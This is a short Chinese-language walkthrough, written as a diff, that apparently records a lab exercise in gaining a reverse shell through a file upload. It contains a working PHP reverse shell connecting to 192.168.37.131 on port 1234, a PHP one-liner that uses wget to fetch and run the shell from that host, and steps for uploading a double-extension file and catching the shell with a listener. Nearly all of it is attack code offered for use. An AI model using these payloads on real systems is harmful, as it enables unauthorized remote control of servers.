@@ -1,0 +1,13 @@
+1.在Kali上写个PHP反弹shell的脚本；并开启Apache服务
+
+<?php $sock=fsockopen("192.168.37.131",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>
+
+/etc/init.d/apache 2 start 或  Service apache2 start
+
+2.在物理机上写个下载并执行该脚本的PHP代码；
+
+<?php system("wget 192.168.37.131/shell.txt -O /tmp/shell.php; php /tmp/shell.php");?>
+
+3.将shell1.php.jpg上传
+
+4.在Kali上监听1234端口；浏览器去访问上传的shell1.php.jpg，成功获取目标的shell
